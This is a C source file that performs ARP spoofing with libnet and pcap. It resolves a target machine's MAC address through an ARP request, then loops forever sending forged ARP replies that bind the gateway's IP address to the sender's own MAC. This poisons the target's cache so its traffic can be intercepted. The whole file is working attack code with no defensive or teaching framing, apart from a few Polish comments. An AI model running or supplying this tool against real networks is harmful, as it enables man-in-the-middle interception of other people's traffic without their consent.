#ifndef _INCL_ARP
#define _INCL_ARP
#include <libnet.h>
#include <pcap.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <linux/if_ether.h>
#include <netinet/ip.h>
#endif
    char errbuf[LIBNET_ERRBUF_SIZE];
u_int32_t target_ip_addr, src_ip_addr;
u_int8_t bcast_hw_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
                                zero_hw_addr[6]  = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
struct arphdr {
    u_int16_t ftype; 
    u_int16_t ptype;
    u_int8_t flen;
    u_int8_t plen;
    u_int16_t opcode;
    u_int8_t sender_mac_addr[6];
    u_int8_t sender_ip_addr[4];
    u_int8_t target_mac_addr[6];
    u_int8_t target_ip_addr[4];
};
struct pthread_params {
    char* target_addr;
    char* gateway_addr;
};
void start_arp_spoof(struct arphdr* arpheader, libnet_t *ln, char* gateway_addr) {
  struct libnet_ether_addr* src_hw_addr;
  ln = libnet_init(LIBNET_LINK, NULL, errbuf);
  u_int32_t gateway_ip_addr = libnet_name2addr4(ln, gateway_addr, LIBNET_RESOLVE);
  u_int32_t zero_ip_addr = libnet_name2addr4(ln, "0.0.0.0", LIBNET_DONT_RESOLVE);
  src_hw_addr = libnet_get_hwaddr(ln);
  libnet_autobuild_arp(
    ARPOP_REPLY,                     /* operation type       */
    src_hw_addr->ether_addr_octet,   /* sender hardware addr */
    (u_int8_t*) &gateway_ip_addr,     /* sender protocol addr */
    arpheader->sender_mac_addr,                    /* target hardware addr */
    (u_int8_t*) &target_ip_addr,       /* target protocol addr */
    ln);                             /* libnet context       */
  libnet_autobuild_ethernet(
    arpheader->sender_mac_addr,                   /* ethernet destination */
    ETHERTYPE_ARP,                   /* ethertype            */
    ln);                             /* libnet context       */	
    printf("starting arp spoof loop\n");
  while(1) {
    sleep(1);
    libnet_write(ln);
  }
}
void *arp_spoof(void *parameters)
{
    printf("arp thread started\n");
    libnet_t *ln;
    
    struct libnet_ether_addr* src_hw_addr;
    struct pcap_pkthdr *pheader;
    struct arphdr *arpheader;
    struct pthread_params *params = (struct pthread_params*) parameters;

    const u_char *bytes;
    pcap_t* handle;
    ln = libnet_init(LIBNET_LINK, NULL, errbuf);
    src_ip_addr = libnet_get_ipaddr4(ln);
    src_hw_addr = libnet_get_hwaddr(ln);
    target_ip_addr = libnet_name2addr4(ln, params->target_addr, LIBNET_RESOLVE); //target ip addr
    libnet_autobuild_arp(
        ARPOP_REQUEST,                   /* operation type       */
        src_hw_addr->ether_addr_octet,   /* sender hardware addr */
        (u_int8_t*) &src_ip_addr,        /* sender protocol addr */
        zero_hw_addr,                    /* target hardware addr */
        (u_int8_t*) &target_ip_addr,     /* target protocol addr */
        ln);                             /* libnet context       *///budujemy arp
    libnet_autobuild_ethernet(
        bcast_hw_addr,                   /* ethernet destination *///adres rozgloszeniowy z samych jedynek
        ETHERTYPE_ARP,                   /* ethertype            */
        ln);                             /* libnet context       *///ramka ethernetowa
    char* perrbuf;
    perrbuf = malloc(PCAP_ERRBUF_SIZE);
    handle = pcap_create(libnet_getdevice(ln), perrbuf);
    pcap_activate(handle);
    printf("ARPING \n");
    int cap;
    while(1) {
        libnet_write(ln);
        while(1) {
	    sleep(1);
            cap = pcap_next_ex(handle, &pheader, &bytes);
            if(cap < 0) {
                printf("arp thread started END %d\n", cap);
                continue;
            }
            struct ethhdr* fhead = (struct ethhdr*) bytes;
            if(ntohs(fhead->h_proto) != ETH_P_ARP)
                continue;

            arpheader = (struct arphdr*) (bytes + ETH_HLEN);
            if (ntohs(arpheader->opcode) == ARPOP_REPLY
                    && memcmp(arpheader->sender_ip_addr, (u_int8_t*) &target_ip_addr, 4) == 0) {
                printf("Retrieved MAC from %s [%02x:%02x:%02x:%02x:%02x:%02x] \n",
                       params->target_addr,
                       arpheader->sender_mac_addr[0],
                       arpheader->sender_mac_addr[1],
                       arpheader->sender_mac_addr[2],
                       arpheader->sender_mac_addr[3],
                       arpheader->sender_mac_addr[4],
                       arpheader->sender_mac_addr[5]);
 		libnet_destroy(ln);
		start_arp_spoof(arpheader, ln, params->gateway_addr);
            }
        }
    }
}


